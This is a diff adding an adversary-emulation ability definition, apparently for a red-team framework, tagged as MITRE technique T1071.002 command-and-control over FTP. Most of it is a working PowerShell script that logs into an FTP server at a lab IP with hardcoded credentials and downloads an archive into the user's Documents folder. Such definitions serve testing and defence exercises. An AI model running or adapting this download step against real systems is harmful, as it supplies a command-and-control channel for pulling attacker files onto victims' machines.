@@ -1,0 +1,105 @@
+- name: Ftp Download archive
+  description: This Payload downloads file from a ftp server
+  tactic: command-and-control
+  technique_id: T1071.002
+  technique_name: 'Application Layer Protocol: File Transfer Protocols'
+  executors:
+  - payloads: []
+    platform: windows
+    name: psh
+    cleanup: []
+    parsers: []
+    command: '####################################################
+
+      # This script downloads a file from a FTP server
+
+      ####################################################
+
+      #
+
+      # Variables to update
+
+      $Username = "test";
+
+      $Password = "123qwe";
+
+      $Ftp = "ftp://192.168.2.222";
+
+      $FtpPort = "2222";
+
+      $RemoteFile = "fake_documents.zip";
+
+      $LocalFile = "$env:HOMEDRIVE"+"$env:HOMEPATH\Documents";
+
+      #
+
+      #Do not modify anything below this line.
+
+      #
+
+      $slash = "/";
+
+      $Column = ":";
+
+      $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFile;
+
+      $Uri=[system.URI] $FtpUri;
+
+      $FtpRequest=[system.net.ftpwebrequest]::Create($Uri);
+
+      $FtpRequest.Credentials=New-Object System.Net.NetworkCredential($Username,$Password);
+
+      $FtpRequest.Method=[system.net.WebRequestMethods+ftp]::DownloadFile;
+
+      $FtpRequest.UseBinary = $true;
+
+      $FtpRequest.KeepAlive = $false;
+
+      $Response=$ftprequest.GetResponse();
+
+      $Strm=$response.GetResponseStream();
+
+      try
+
+      {
+
+      $targetfile = New-Object IO.FileStream ($LocalFile,[IO.FileMode]::Create);
+
+      "File created: $LocalFile";
+
+      [byte[]]$readbuffer = New-Object byte[] 1024;
+
+      do{
+
+      $readlength = $strm.Read($readbuffer,0,1024);
+
+      $targetfile.Write($readbuffer,0,$readlength);
+
+      }
+
+      while ($readlength -ne 0)
+
+
+      $targetfile.close();
+
+      }
+
+      catch
+
+      {
+
+      $_|fl * -Force;
+
+      }
+
+      '
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  delete_payload: false
+  id: ftp_download_archive_file
